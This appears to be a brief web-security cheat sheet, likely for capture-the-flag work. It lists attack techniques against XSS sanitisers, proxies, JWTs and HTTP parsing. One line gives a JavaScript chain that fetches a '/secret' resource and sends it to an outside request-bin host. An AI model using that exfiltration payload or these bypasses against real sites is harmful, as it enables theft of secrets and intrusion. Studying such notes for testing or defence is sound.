## General
- Javascript chaining, e.g.: ```fetch("/secret").then(r=>r.text()).then(r=>fetch("requestbin.../?secret="+r))```
- 


## XSS
- Unicode equivalence
- [DOMPurify 2.0.17 bypass](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)

## XPATH
- TODO: blind, link cheatsheet


## SSTI
- TODO: Flesh out with bypasses

## Proxies
- gunicorn SCRIPT_NAME header bypasses blacklists
- [nginx misconfigurations](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)

## JWT
- Change algorithm
- Deduce public key from RSA signatures
- Offline crack HS256

## HTTP
- HTTP parameter pollution
- HTTP request splitting
- 